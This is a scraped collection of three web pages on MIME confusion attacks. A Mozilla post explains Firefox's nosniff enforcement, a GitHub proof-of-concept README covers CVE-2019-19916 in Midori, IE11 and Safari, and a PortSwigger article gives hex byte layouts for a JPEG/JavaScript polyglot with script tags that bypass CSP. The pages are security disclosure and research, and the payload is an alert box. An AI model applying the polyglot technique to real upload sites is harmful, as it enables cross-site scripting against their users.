=== Content from blog.mozilla.org_3e82fa9d_20250120_231800.html ===

[Mozilla](https://www.mozilla.org/?utm_source=blog.mozilla.org&utm_medium=referral&utm_campaign=blog-nav "Visit mozilla.org")
Menu

* [About Mozilla](https://www.mozilla.org/about/?utm_source=blog.mozilla.org&utm_medium=referral&utm_campaign=blog-nav)
* [Products](https://www.mozilla.org/firefox/products/?utm_source=blog.mozilla.org&utm_medium=referral&utm_campaign=blog-nav)
* [Give](https://donate.mozilla.org/?presets=50,30,20,10&amount=30&currency=usd&utm_source=blog.mozilla.org&utm_medium=referral&utm_campaign=blog-nav)
* [Discover Firefox](https://www.mozilla.org/firefox/?utm_source=blog.mozilla.org&utm_medium=referral&utm_campaign=blog-nav)

[#### Mozilla Security Blog](https://blog.mozilla.org/security/ "Go to the front page")

* Search this site

  Search

**Categories:**
[Security](https://blog.mozilla.org/security/category/security/)
# Mitigating MIME Confusion Attacks in Firefox

Christoph Kerschbaumer
August 26, 2016

Scanning the content of a file allows web browsers to detect the format of a file regardless of the specified Content-Type by the web server. For example, if Firefox requests script from a web server and that web server sends that script using a Content-Type of “image/jpg” Firefox will successfully detect the actual format and will execute the script. This technique, colloquially known as “MIME sniffing”, compensates for incorrect, or even complete absence of metadata browsers need to interpret the contents of a page resource. Firefox uses contextual clues (the HTML element that triggered the fetch) or also inspects the initial bytes of media type loads to determine the correct content type. While MIME sniffing increases the web experience for the majority of users, it also opens up an attack vector known as MIME confusion attack.

Consider a web application which allows users to upload image files but does not verify that the user actually uploaded a valid image, e.g., the web application just checks for a valid file extension. This lack of verification allows an attacker to craft and upload an image which contains scripting content. The browser then renders the content as HTML opening the possibility for a Cross-Site Scripting attack (XSS). Even worse, some files can even be polyglots, which means their content satisfies two content types. E.g., a GIF can be crafted in a way to be valid image and also valid JavaScript and the correct interpretation of the file solely depends on the context.

Starting with Firefox 50, Firefox will reject stylesheets, images or scripts if their MIME type does not match the context in which the file is loaded if the server sends the response header “X-Content-Type-Options: nosniff” ([view specification](https://fetch.spec.whatwg.org/#x-content-type-options-header)). More precisely, if the Content-Type of a file does not match the context (see detailed list of accepted Content-Types for each format underneath) Firefox will block the file, hence prevent such MIME confusion attacks and will display the following message in the console:

[![The resource from “https://example.com/bar.jpg” was blocked due to MIME type mismatch (X-Content-Type-Options: nosniff).](https://blog.mozilla.org/security/files/2016/08/xcto_console_message-600x43.png)](https://blog.mozilla.org/security/files/2016/08/xcto_console_message.png)

*Valid Content-Types for Stylesheets:*

– “text/css”

*Valid Content-Types for images:*

– have to start with “image/”

*Valid Content-Types for Scripts:*

– “application/javascript”

– “application/x-javascript”

– “application/ecmascript”

– “application/json”

– “text/ecmascript”

– “text/javascript”

– “text/json”

**Tags:** [Mime confusion](https://blog.mozilla.org/security/tag/mime-confusion/), [X-Content-Type-Options](https://blog.mozilla.org/security/tag/x-content-type-options/)

#### Browse fast. Browse free.

[Download Firefox](https://www.mozilla.org/firefox/new/?utm_source=blog.mozilla.org&utm_campaign=firefox_frontier&utm_medium=referral)

[Previous article
**MWoS 2015: Let’s Encrypt Automation Tooling**
August 8, 2016](https://blog.mozilla.org/security/2016/08/08/mwos-2015-lets-encrypt-automation-tooling/)

[Next article
**Firefox AddressSanitizer builds have been moved**
September 9, 2016](https://blog.mozilla.org/security/2016/09/09/firefox-addresssanitizer-builds-have-been-moved/)

#### More articles in “Security”

* ##### [Behind the Scenes: Fixing an In-the-Wild Firefox Exploit](https://blog.mozilla.org/security/2024/10/11/behind-the-scenes-fixing-an-in-the-wild-firefox-exploit/)

  October 11, 2024
* ##### [Firefox will upgrade more Mixed Content in Version 127](https://blog.mozilla.org/security/2024/06/05/firefox-will-upgrade-more-mixed-content-in-version-127/)

  June 5, 2024
* ##### [Rapidly Leveling up Firefox Security](https://blog.mozilla.org/security/2024/04/04/rapidly-leveling-up-firefox-security/)

  April 4, 2024
* ##### [Mozilla VPN Security Audit 2023](https://blog.mozilla.org/security/2023/12/06/mozilla-vpn-security-audit-2023/)

  December 6, 2023
* ##### [Version 2.9 of the Mozilla Root Store Policy](https://blog.mozilla.org/security/2023/09/13/version-2-9-of-the-mozilla-root-store-policy/)

  September 13, 2023

#### Recent articles

* ##### [Behind the Scenes: Fixing an In-the-Wild Firefox Exploit](https://blog.mozilla.org/security/2024/10/11/behind-the-scenes-fixing-an-in-the-wild-firefox-exploit/)

  October 11, 2024
* ##### [Firefox will upgrade more Mixed Content in Version 127](https://blog.mozilla.org/security/2024/06/05/firefox-will-upgrade-more-mixed-content-in-version-127/)

  June 5, 2024
* ##### [Rapidly Leveling up Firefox Security](https://blog.mozilla.org/security/2024/04/04/rapidly-leveling-up-firefox-security/)

  April 4, 2024
* ##### [Mozilla VPN Security Audit 2023](https://blog.mozilla.org/security/2023/12/06/mozilla-vpn-security-audit-2023/)

  December 6, 2023
* ##### [Version 2.9 of the Mozilla Root Store Policy](https://blog.mozilla.org/security/2023/09/13/version-2-9-of-the-mozilla-root-store-policy/)

  September 13, 2023

### Keep up with all things Firefox.

Your e-mail address

Country
- select -
Afghanistan
Akrotiri
Albania
Algeria
American Samoa
Andorra
Angola
Anguilla
Antarctica
Antigua and Barbuda
Argentina
Armenia
Aruba
Ashmore and Cartier Islands
Australia
Austria
Azerbaijan
Bahamas, The
Bahrain
Baker Island
Bangladesh
Barbados
Bassas da India
Belarus
Belgium
Belize
Benin
Bermuda
Bhutan
Bolivia
Bonaire, Sint Eustatius, and Saba
Bosnia and Herzegovina
Botswana
Bouvet Island
Brazil
British Indian Ocean Territory
Brunei
Bulgaria
Burkina Faso
Burma
Burundi
Cabo Verde
Cambodia
Cameroon
Canada
Cayman Islands
Central African Republic
Chad
Chile
China
Christmas Island
Clipperton Island
Cocos (Keeling) Islands
Colombia
Comoros
Congo (Brazzaville)
Congo (Kinshasa)
Cook Islands
Coral Sea Islands
Costa Rica
Croatia
Cuba
Curaçao
Cyprus
Czech Republic
Côte d’Ivoire
Denmark
Dhekelia
Diego Garcia
Djibouti
Dominica
Dominican Republic
Ecuador
Egypt
El Salvador
Equatorial Guinea
Eritrea
Estonia
Ethiopia
Europa Island
Falkland Islands (Islas Malvinas)
Faroe Islands
Fiji
Finland
France
French Guiana
French Polynesia
French Southern and Antarctic Lands
Gabon
Gambia, The
Gaza Strip
Georgia
Germany
Ghana
Gibraltar
Glorioso Islands
Greece
Greenland
Grenada
Guadeloupe
Guam
Guatemala
Guernsey
Guinea
Guinea-Bissau
Guyana
Haiti
Heard Island and McDonald Islands
Honduras
Hong Kong
Howland Island
Hungary
Iceland
India
Indonesia
Iran
Iraq
Ireland
Isle of Man
Israel
Italy
Jamaica
Jan Mayen
Japan
Jarvis Island
Jersey
Johnston Atoll
Jordan
Juan de Nova Island
Kazakhstan
Kenya
Kingman Reef
Kiribati
Korea, North
Korea, South
Kosovo
Kuwait
Kyrgyzstan
Laos
Latvia
Lebanon
Lesotho
Liberia
Libya
Liechtenstein
Lithuania
Luxembourg
Macau
Macedonia
Madagascar
Malawi
Malaysia
Maldives
Mali
Malta
Marshall Islands
Martinique
Mauritania
Mauritius
Mayotte
Mexico
Micronesia, Federated States of
Midway Islands
Moldova
Monaco
Mongolia
Montenegro
Montserrat
Morocco
Mozambique
Namibia
Nauru
Navassa Island
Nepal
Netherlands
New Caledonia
New Zealand
Nicaragua
Niger
Nigeria
Niue
Norfolk Island
Northern Mariana Islands
Norway
Oman
Pakistan
Palau
Palmyra Atoll
Panama
Papua New Guinea
Paracel Islands
Paraguay
Peru
Philippines
Pitcairn Islands
Poland
Portugal
Puerto Rico
Qatar
Reunion
Romania
Russia
Rwanda
Saint Barthelemy
Saint Helena, Ascension, and Tristan da Cunha
Saint Kitts and Nevis
Saint Lucia
Saint Martin
Saint Pierre and Miquelon
Saint Vincent and the Grenadines
Samoa
San Marino
Sao Tome and Principe
Saudi Arabia
Senegal
Serbia
Seychelles
Sierra Leone
Singapore
Sint Maarten
Slovakia
Slovenia
Solomon Islands
Somalia
South Africa
South Georgia and South Sandwich Islands
South Sudan
Spain
Spratly Islands
Sri Lanka
Sudan
Suriname
Svalbard
Swaziland
Sweden
Switzerland
Syria
Taiwan
Tajikistan
Tanzania
Thailand
Timor-Leste
Togo
Tokelau
Tonga
Trinidad and Tobago
Tromelin Island
Tunisia
Turkey
Turkmenistan
Turks and Caicos Islands
Tuvalu
Uganda
Ukraine
United Arab Emirates
United Kingdom
United States
Uruguay
Uzbekistan
Vanuatu
Vatican City
Venezuela
Vietnam
Virgin Islands, British
Virgin Islands, U.S.
Wake Island
Wallis and Futuna
West Bank
Western Sahara
Yemen
Zambia
Zimbabwe

Language
Bahasa Indonesia
Deutsch
English
Español
Français
Polski
Português
Русский
正體中文

 HTML
 Text

I’m okay with Mozilla handling my info as explained in this [Privacy Policy](https://www.mozilla.org/privacy/).

Sign up now

We will only send you Mozilla-related information.

## Thanks!

If you haven’t previously confirmed a subscription to a Mozilla-related newsletter you may have to do so. Please check your inbox or your spam filter for an e-mail from us.

[Mozilla](https://www.mozilla.org/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### [Mozilla](https://www.mozilla.org/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

* [About](https://www.mozilla.org/about/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Contact Us](https://www.mozilla.org/contact/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Donate](https://donate.mozilla.org/?presets=50,30,20,10&amount=30&currency=usd&utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* + [Twitter (@mozilla)](https://twitter.com/mozilla)
  + [Instagram (@mozillagram)](https://www.instagram.com/mozillagram/)

##### [Firefox](https://www.mozilla.org/firefox/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

* [Download Firefox](https://www.mozilla.org/firefox/new/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Desktop](https://www.mozilla.org/firefox/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Mobile](https://www.mozilla.org/firefox/mobile/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Features](https://www.mozilla.org/firefox/features/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Beta, Nightly, Developer Edition](https://www.mozilla.org/firefox/channel/desktop/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* + [Twitter (@firefox)](https://twitter.com/firefox)
  + [YouTube (firefoxchannel)](https://www.youtube.com/firefoxchannel)

* [Website Privacy Notice](https://www.mozilla.org/privacy/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)

Visit Mozilla Corporation’s not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org).

Portions of this content are ©1998-2025 by individual contributors. Content available under a [Creative Commons license](https://www.mozilla.org/foundation/licensing/website-content/).



=== Content from github.com_fc3296ca_20250120_231801.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FV1n1v131r4%2FMIME-Confusion-Attack-on-Midori-Browser%2Fblob%2Fmaster%2FREADME.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FV1n1v131r4%2FMIME-Confusion-Attack-on-Midori-Browser%2Fblob%2Fmaster%2FREADME.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=V1n1v131r4%2FMIME-Confusion-Attack-on-Midori-Browser)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[V1n1v131r4](/V1n1v131r4)
/
**[MIME-Confusion-Attack-on-Midori-Browser](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser)**
Public

* [Notifications](/login?return_to=%2FV1n1v131r4%2FMIME-Confusion-Attack-on-Midori-Browser) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FV1n1v131r4%2FMIME-Confusion-Attack-on-Midori-Browser)
* [Star
   0](/login?return_to=%2FV1n1v131r4%2FMIME-Confusion-Attack-on-Midori-Browser)

* [Code](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser)
* [Issues
  0](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/issues)
* [Pull requests
  0](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/pulls)
* [Actions](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/actions)
* [Projects
  0](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/projects)
* [Security](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/security)
* [Insights](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/pulse)

Additional navigation options

* [Code](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser)
* [Issues](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/issues)
* [Pull requests](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/pulls)
* [Actions](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/actions)
* [Projects](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/projects)
* [Security](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/security)
* [Insights](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/pulse)

## Files

 master
## Breadcrumbs

1. [MIME-Confusion-Attack-on-Midori-Browser](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/tree/master)
/
# README.md

Copy path Blame  Blame
## Latest commit

## History

[History](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/commits/master/README.md)59 lines (34 loc) · 2.82 KB master
## Breadcrumbs

1. [MIME-Confusion-Attack-on-Midori-Browser](/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/tree/master)
/
# README.md

Top
## File metadata and controls

* Preview
* Code
* Blame

59 lines (34 loc) · 2.82 KB[Raw](https://github.com/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser/raw/refs/heads/master/README.md)
# MIME Confusion Attack

This PoC describes a MIME confusion attack on:

* Midori Browser 0.5.11 on Windows 10 // I published this CVE-2019-19916 (<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19916>)
* Internet Explorer 11.535.18362.0 on Windows 10
* Safari 10.1.2 (12603.3.8) on MacOS Sierra

## About the MIME Confusion Attack

Scanning the content of a file allows web browsers to detect the format of a file regardless of the specified Content-Type by the web server. For example, if browser requests script from a web server and that web server sends that script using a Content-Type of “image/jpg” browser will successfully detect the actual format and will execute the script. This technique, colloquially known as “MIME sniffing”, compensates for incorrect, or even complete absence of metadata browsers need to interpret the contents of a page resource. The browser uses contextual clues (the HTML element that triggered the fetch) or also inspects the initial bytes of media type loads to determine the correct content type. While MIME sniffing increases the web experience for the majority of users, it also opens up an attack vector known as MIME confusion attack.

Consider a web application which allows users to upload image files but does not verify that the user actually uploaded a valid image, e.g., the web application just checks for a valid file extension. This lack of verification allows an attacker to craft and upload an image which contains scripting content. The browser then renders the content as HTML opening the possibility for a Cross-Site Scripting attack (XSS). Even worse, some files can even be polyglots, which means their content satisfies two content types. E.g., a GIF can be crafted in a way to be valid image and also valid JavaScript and the correct interpretation of the file solely depends on the context.

## About Midori Browser

Download: <https://www.midori-browser.org/download/>

## Step by Step Proof of Concept

As PoC i used a polyglot GIF with a built-in JavaScript code (available at: <http://portswigger-labs.net/polyglot/jpeg/xss_within_header_compressed_small_logo.jpg>):

```
 */=alert("Burp rocks.")/*

```

And the following HTML / JS code:

```
  <html>
     <img src="2x.jpg">
	   <script src="https://poc.sejalivre.org/wp-content/uploads/2019/12/2x.jpg"></script>
 </html>

```

I hosted at <http://joomla.sejalivre.org>

Simply accessed the page mentioned above on browsers.

As shown, we find that the browsers has no implementation against MIME confusion attacks

## Midori

[![alt](https://camo.githubusercontent.com/526d7057d3e0e088b1bbb1a5f5ca2831287bd37e38cf61dce3d823899ee979b3/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f4d442d312e706e67)](https://camo.githubusercontent.com/526d7057d3e0e088b1bbb1a5f5ca2831287bd37e38cf61dce3d823899ee979b3/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f4d442d312e706e67)
[![alt](https://camo.githubusercontent.com/c2be08dd3cdd3f480df913e898c258a84a1aca32404c804113042eca496d0dab/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f4d442d322e706e67)](https://camo.githubusercontent.com/c2be08dd3cdd3f480df913e898c258a84a1aca32404c804113042eca496d0dab/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f4d442d322e706e67)

## Internet Explorer

[![alt](https://camo.githubusercontent.com/759a946b998c8ac1b840acea36718d84c907a04f084cb65f72893419ef9b3c92/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f49452d312e706e67)](https://camo.githubusercontent.com/759a946b998c8ac1b840acea36718d84c907a04f084cb65f72893419ef9b3c92/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f49452d312e706e67)
[![alt](https://camo.githubusercontent.com/0b490b14a0f2f0817792bb1095a878ad8b95696cc09851f86632055736d520f1/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f49452d322e706e67)](https://camo.githubusercontent.com/0b490b14a0f2f0817792bb1095a878ad8b95696cc09851f86632055736d520f1/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f49452d322e706e67)

## Safari

[![alt](https://camo.githubusercontent.com/3ebbbac9ddcaacbaea794981fee815306580d2922b9347f614aedd09f0e49b3a/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f53462d312e706e67)](https://camo.githubusercontent.com/3ebbbac9ddcaacbaea794981fee815306580d2922b9347f614aedd09f0e49b3a/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f53462d312e706e67)
[![alt](https://camo.githubusercontent.com/b683e60dc3c91dadfd5b7b1c11f75231fb07e39159170ea5e74914afccd05a6e/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f53462d322e706e67)](https://camo.githubusercontent.com/b683e60dc3c91dadfd5b7b1c11f75231fb07e39159170ea5e74914afccd05a6e/68747470733a2f2f63696265722e73656a616c697672652e6f72672f57502f53462d322e706e67)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from portswigger.net_e09c8c76_20250120_231801.html ===


[Login](/users)

Products

Solutions

[Research](/research)
[Academy](/web-security)
Support

Company

[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[My account](/users/youraccount)
[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)
[![Burp Suite Enterprise Edition](/content/images/svg/icons/enterprise.svg)
**Burp Suite Enterprise Edition**
The enterprise-enabled dynamic web vulnerability scanner.](/burp/enterprise)
[![Burp Suite Professional](/content/images/svg/icons/professional.svg)
**Burp Suite Professional**
The world's #1 web penetration testing toolkit.](/burp/pro)
[![Burp Suite Community Edition](/content/images/svg/icons/community.svg)
**Burp Suite Community Edition**
The best manual tools to start web security testing.](/burp/communitydownload)
[![Dastardly, from Burp Suite](/mega-nav/images/dastardly.svg)
**Dastardly, from Burp Suite**
Free, lightweight web application security scanning for CI/CD.](/burp/dastardly)
[View all product editions](/burp)

[**Burp Scanner**

Burp Suite's web vulnerability scanner

![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg)](/burp/vulnerability-scanner)

[**Attack surface visibility**
Improve security posture, prioritize manual testing, free up time.](/solutions/attack-surface-visibility)
[**CI-driven scanning**
More proactive security - find and fix vulnerabilities earlier.](/solutions/ci-driven-scanning)
[**Application security testing**
See how our software enables the world to secure the web.](/solutions)
[**DevSecOps**
Catch critical bugs; ship more secure software, more quickly.](/solutions/devsecops)
[**Penetration testing**
Accelerate penetration testing - find more bugs, more quickly.](/solutions/penetration-testing)
[**Automated scanning**
Scale dynamic scanning. Reduce risk. Save time/money.](/solutions/automated-security-testing)
[**Bug bounty hunting**
Level up your hacking and earn more bug bounties.](/solutions/bug-bounty-hunting)
[**Compliance**
Enhance security monitoring to comply with confidence.](/solutions/compliance)

[View all solutions](/solutions)

[**Product comparison**

What's the difference between Pro and Enterprise Edition?

![Burp Suite Professional vs Burp Suite Enterprise Edition](/mega-nav/images/burp-suite.jpg)](/burp/enterprise/resources/enterprise-edition-vs-professional)

[**Support Center**
Get help and advice from our experts on all things Burp.](/support)
[**Documentation**
Tutorials and guides for Burp Suite.](/burp/documentation)
[**Get Started - Professional**
Get started with Burp Suite Professional.](/burp/documentation/desktop/getting-started)
[**Get Started - Enterprise**
Get started with Burp Suite Enterprise Edition.](/burp/documentation/enterprise/getting-started)
[**User Forum**
Get your questions answered in the User Forum.](https://forum.portswigger.net/)
[**Downloads**
Download the latest version of Burp Suite.](/burp/releases)

[Visit the Support Center](/support)

[**Downloads**

Download the latest version of Burp Suite.

![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg)](/burp/releases)

Articles

* [Overview](/research)
* Core Topics

  [Black Hat](/research/black-hat)
  [XSS](/research/cross-site-scripting-research)
  [Request Smuggling](/research/request-smuggling)
  [Template Injection](/research/template-injection)
  [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)
* [Articles](/research/articles)
* Meet the Researchers

  [James Kettle](/research/james-kettle)
  [Gareth Heyes](/research/gareth-heyes)
  [Martin Doyhenard](/research/martin-doyhenard)
  [Zakhar Fedotkin](/research/zakhar-fedotkin)
* [Talks](/research/talks)
* [RSS](/research/rss)

# Bypassing CSP using polyglot JPEGs

![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)
### [Gareth Heyes](/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

* **Published:** 01 December 2016 at 13:44 UTC
* **Updated:** 14 June 2019 at 12:15 UTC

![Bypassing CSP using polyglot JPEGs](/cms/images/5a/5a/66fabbe8f14b-article-bypassing-csp-using-polyglot-jpegs-article.png "PortSwigger Ltd")

[James](http://twitter.com/albinowax) challenged me to see if it was possible to create a polyglot JavaScript/JPEG. Doing so would allow me to bypass [CSP](/web-security/cross-site-scripting/content-security-policy) on almost any website that hosts user-uploaded images on the same domain. I gleefully took up the challenge and begun dissecting the format. The first four bytes are a valid non-ASCII JavaScript variable 0xFF 0xD8 0xFF 0xE0. Then the next two bytes specify the length of the JPEG header. If we make that length of the header 0x2F2A using the bytes 0x2F 0x2A as you might guess we have a non-ASCII variable followed by a multi-line JavaScript comment. We then have to pad out the JPEG header to the length of 0x2F2A with nulls. Here's what it looks like:

`FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00....`

Inside a JPEG comment we can close the JavaScript comment and create an assignment for our non-ASCII JavaScript variable followed by our payload, then create another multi-line comment at the end of the JPEG comment.

`FF FE 00 1C 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A`

0xFF 0xFE is the comment header 0x00 0x1C specifies the length of the comment then the rest is our JavaScript payload which is of course \*/=alert("Burp rocks.")/\*

Next we need to close the JavaScript comment, I edited the last four bytes of the image data before the end of image marker. Here's what the end of the file looks like:

`2A 2F 2F 2F FF D9`

0xFF 0xD9 is the end of image marker. Great so there is our polyglot JPEG, well not quite yet. It works great if you don't specify a charset but on Firefox when using a UTF-8 character set for the document it corrupts our polyglot when included as an script! On MDN it doesn't state that the script supports the charset attribute but it does. So to get the script to work you need to specify the ISO-8859-1 charset on the script tag and it executes fine.

It's worth noting that the polyglot JPEG works on Safari, Firefox, Edge and IE11. Chrome sensibly does not execute the image as JavaScript.

Here is the polyglot JPEG:

[Polyglot JPEG](http://portswigger-labs.net/polyglot/jpeg/xss.jpg)

The code to execute the image as JavaScript is as follows:

`<script charset="ISO-8859-1" src="http://portswigger-labs.net/polyglot/jpeg/xss.jpg"></script>`
### File size restrictions

I attempted to upload this graphic as a phpBB profile picture but it has restrictions in place. There is a 6k file size limit and maximum dimensions of 90x90. I reduced the size of the logo by cropping and thought about how I could reduce the JPEG data. In the JPEG header I use /\* which in hex is 0x2F and 0x2A, combined 0x2F2A which results in a length of 12074 which is a lot of padding and will result in a graphic far too big to fit as a profile picture. Looking at the ASCII table I tried to find a combination of characters that would be valid JavaScript and reduce the amount of padding required in the JPEG header whilst still being recognised as a valid JPEG file.

The smallest starting byte I could find was 0x9 (a tab character) followed by 0x3A (a colon) which results in a combined hex value of 0x093A (2362) that shaves a lot of bytes from our file and creates a valid non-ASCII JavaScript label statement, followed by a variable using the JFIF identifier. Then I place a forward slash 0x2F instead of the NULL character at the end of the JFIF identifier and an asterisk as the version number. Here's what the hex looks like:

`FF D8 FF E0 09 3A 4A 46 49 46 2F 2A`

Now we continue the rest of the JPEG header then pad with NULLs and inject our JavaScript payload:

`FF D8 FF E0 09 3A 4A 46 49 46 2F 2A 01 01 00 48 00 48 00 00 00 00 00 00 00 ... (padding more nulls) 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A`

Here is the smaller graphic:

[Polyglot JPEG smaller](http://portswigger-labs.net/polyglot/jpeg/xss_within_header_compressed_small_logo.jpg)

### Impact

If you allow users to upload JPEGs, these uploads are on the same domain as your app, and your CSP allows script from "self", you can bypass the CSP using a polyglot JPEG by injecting a script and pointing it to that image.

### Conclusion

In conclusion if you allow JPEG uploads on your site or indeed any type of file, it's worth placing these assets on a separate domain. When validating a JPEG, you should rewrite the JPEG header to ensure no code is sneaked in there and remove all JPEG comments. Obviously it's also essential that your CSP does not whitelist your image assets domain for script.

This post wouldn't be possible without the excellent work of [Ange Albertini](https://twitter.com/angealbertini). I used his [JPEG format graphic](https://raw.githubusercontent.com/corkami/pics/master/JPG.png) extensively to create the polygot JPEG. [Jasvir Nagra](https://twitter.com/jasvir/) also inspired me with his blog post about [polyglot GIFs](http://www.thinkfu.com/blog/gifjavascript-polyglots).

[PoC](http://portswigger-labs.net/csp/csp.php?x=%3Cscript%20charset=%22ISO-8859-1%22%20src=%22http://portswigger-labs.net/polyglot/jpeg/xss.jpg%22%3E%3C/script%3E)

#### Update...

